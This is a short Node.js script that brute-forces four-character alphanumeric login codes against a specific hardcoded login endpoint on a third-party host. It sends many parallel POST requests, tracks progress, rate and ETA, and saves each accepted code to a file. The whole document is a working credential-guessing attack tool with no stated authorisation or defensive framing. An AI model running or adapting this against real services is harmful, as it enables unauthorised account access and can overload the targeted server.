var request = require('request'),
    randomstring = require("randomstring"),
    fs = require('fs');

var file,
    begin,
    foundI = 0,
    counter = 0,
    failed = 0,
    connections = 20;

// Code Style
var cChars = "0123456789abcdefghijklmnopqrstuvwxyz",
    cLength = 4;

function doCode(i) {
    code = i.toString(36);

    while (code.length < cLength) {
        code = "0" + code;
    }

    if (i % 40 === 0) {
        var nowT = new Date().valueOf();
        var timeNeeded = (nowT - begin) / 1000;
        var percentage = i / Math.pow(cChars.length, cLength) * 100;
        var left = (Math.pow(cChars.length, cLength) - i);
        console.log("state: " + percentage + "% | checked: " + i + " | left: " + left + " | time-needed: " + timeNeeded + "s | ETA: " + (i / timeNeeded * (Math.pow(cChars.length, cLength) - i)) + "s | " + (i / timeNeeded) + " req/s | failed res: " + failed + " | found: " + foundI);
    }

    request({
        url: 'http://new.maxkl.de:8080/login2',
        json: true,
        body: {
            code: code
        },
        method: 'POST',

        headers: {
            "Accept": "application/x-www-form-urlencoded",
            "Content-Type": "application/json"
        }
    }, function(err, response, body) {
        if (err) {
            console.dir("invalid response: " + err);
            failed++;
            doCode(i);
        } else {
            var found = body.found;

            if (found) {
                console.log("found: " + code);
                file.write(code + "\n");
                foundI++;
            }
            doCode(i + connections);
        }


    });
}

if (process.argv[2] !== undefined && process.argv[3] !== undefined) {
    iStart = parseInt(process.argv[3]);
    connections = parseInt(process.argv[2]);
    var now = new Date();
    begin = now.valueOf();
    var date = now.getYear() + 1900 + "-" + now.getMonth() + "-" + now.getDate() + "_" + now.getHours() + "-" + now.getMinutes() + "-" + now.getSeconds();
    var file = fs.createWriteStream("founds_" + date + "_" + process.pid + ".txt", {
        flags: 'a',
        defaultEncoding: 'utf8',
        fd: null,
        autoClose: true
    });

    file.write("[" + new Date().toLocaleTimeString() + "]\n");

    for (var i = iStart; i < connections; i++) {
        doCode(i);
    }

} else {
    console.error("Usage: node app.js [connections] [start]");
    console.error("connections: connections at a time [20]");
    console.error("start: start index (useful for several processes) [0]");
}
